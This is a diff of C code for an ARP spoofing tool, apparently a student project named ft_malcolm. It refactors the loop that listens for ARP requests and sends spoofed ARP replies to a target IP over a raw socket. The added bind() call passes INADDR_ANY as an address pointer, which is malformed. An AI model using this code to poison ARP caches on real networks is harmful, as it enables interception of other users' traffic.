@@ -78,6 +78,10 @@ static int init_sock(t_env *env, int proto, int type, int mode)
 	}
 	if (mode == ETH_P_ARP)
 	{
+		if (env->specific == false)
+		{
+			bind(env->sock_fd, INADDR_ANY, sizeof(struct sockaddr));
+		}
 		if (setsockopt(env->sock_fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv_out, sizeof(tv_out)) != 0)
 		{
 			return (-1);
@@ -140,17 +144,29 @@ t_arp_packet *build_pkt(uint8_t *spa, uint8_t *tpa, uint8_t *sha, uint8_t *tha, 
 	return (pkt);
 }
 
-bool listen_arp(t_env *env, struct ether_arp *arp_frame, struct ether_arp *resp_arp_frame, bool done)
+int ft_malcolm(t_env *env)
 {
 	size_t buf_size = PKT_SIZE;
 	char buf[buf_size];
 	char resp_buf[buf_size];
+	struct ether_arp *arp_frame;
+	struct ether_arp *resp_arp_frame;
+	t_arp_packet *pkt = NULL;
+	struct sockaddr target_addr;
+	bool done = false;
 
 	ft_bzero(buf, buf_size);
 	ft_bzero(resp_buf, buf_size);
+	if (getlocalhost(env))
+		return (-1);
+	if (init_sock(env, AF_PACKET, SOCK_RAW, ETH_P_ARP))
+		return (-1);
+	print_init(env);
+	g_stop = false;
+	signal(SIGINT, sig_handler);
 	while (g_stop == false && done == false)
 	{
-		recvfrom(env->sock_fd, buf, buf_size, 0, NULL, 0);
+		recv(env->sock_fd, buf, buf_size, 0);
 		if ((((buf[12]) << 8) + buf[13]) == ETH_P_ARP)
 		{
 			arp_frame = (struct ether_arp *)(buf + 14);
@@ -166,7 +182,7 @@ bool listen_arp(t_env *env, struct ether_arp *arp_frame, struct ether_arp *resp_
 						   arp_frame->arp_tha[0], arp_frame->arp_tha[1], arp_frame->arp_tha[2], arp_frame->arp_tha[3], arp_frame->arp_tha[4], arp_frame->arp_tha[5]);
 					if (g_stop == false)
 					{
-						recvfrom(env->sock_fd, resp_buf, buf_size, 0, NULL, 0);
+						recv(env->sock_fd, resp_buf, buf_size, 0);
 						if ((((resp_buf[12]) << 8) + resp_buf[13]) == ETH_P_ARP)
 						{
 							resp_arp_frame = (struct ether_arp *)(resp_buf + 14);
@@ -190,53 +206,11 @@ bool listen_arp(t_env *env, struct ether_arp *arp_frame, struct ether_arp *resp_
 			}
 		}
 	}
-	return (done);
-}
-
-int ft_malcolm(t_env *env)
-{
-	t_arp_packet *pkt = NULL;
-	struct sockaddr target_addr;
-	bool done = false;
-	struct ether_arp *arp_frame = NULL;
-	struct ether_arp *resp_arp_frame = NULL;
-
-	if ((arp_frame = (struct ether_arp *)malloc(sizeof(struct ether_arp))) == NULL)
-	{
-		return (-1);
-	}
-	if ((resp_arp_frame = (struct ether_arp *)malloc(sizeof(struct ether_arp))) == NULL)
-	{
-		free(arp_frame);
-		return (-1);
-	}
-	ft_bzero(arp_frame, sizeof(struct ether_arp));
-	ft_bzero(resp_arp_frame, sizeof(struct ether_arp));
-	if (getlocalhost(env))
-	{
-		free(arp_frame);
-		free(resp_arp_frame);
-		return (-1);
-	}
-	if (init_sock(env, AF_PACKET, SOCK_RAW, ETH_P_ARP))
-	{
-		free(arp_frame);
-		free(resp_arp_frame);
-		return (-1);
-	}
-	print_init(env);
-	g_stop = false;
-	signal(SIGINT, sig_handler);
-	done = listen_arp(env, arp_frame, resp_arp_frame, done);
 	close(env->sock_fd);
 	if (g_stop == false)
 	{
 		if (init_sock(env, AF_INET, SOCK_PACKET, ETH_P_RARP))
-		{
-			free(arp_frame);
-			free(resp_arp_frame);
 			return (-1);
-		}
 		while (g_stop == false)
 		{
 			printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
@@ -246,8 +220,6 @@ int ft_malcolm(t_env *env)
 			if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, arp_frame->arp_sha, false)) == NULL)
 			{
 				close(env->sock_fd);
-				free(arp_frame);
-				free(resp_arp_frame);
 				return (-1);
 			}
 			target_addr = *(struct sockaddr *)env->target_ip;
@@ -255,8 +227,6 @@ int ft_malcolm(t_env *env)
 			if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
 			{
 				close(env->sock_fd);
-				free(arp_frame);
-				free(resp_arp_frame);
 				free(pkt);
 				return (-1);
 			}
@@ -272,8 +242,6 @@ int ft_malcolm(t_env *env)
 					if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, resp_arp_frame->arp_sha, true)) == NULL)
 					{
 						close(env->sock_fd);
-						free(arp_frame);
-						free(resp_arp_frame);
 						return (-1);
 					}
 					target_addr = *(struct sockaddr *)env->target_ip;
@@ -282,8 +250,6 @@ int ft_malcolm(t_env *env)
 					{
 						close(env->sock_fd);
 						free(pkt);
-						free(arp_frame);
-						free(resp_arp_frame);
 						return (-1);
 					}
 					free(pkt);
@@ -299,7 +265,5 @@ int ft_malcolm(t_env *env)
 		close(env->sock_fd);
 		printf("Done.\n");
 	}
-	free(arp_frame);
-	free(resp_arp_frame);
 	return (0);
 }
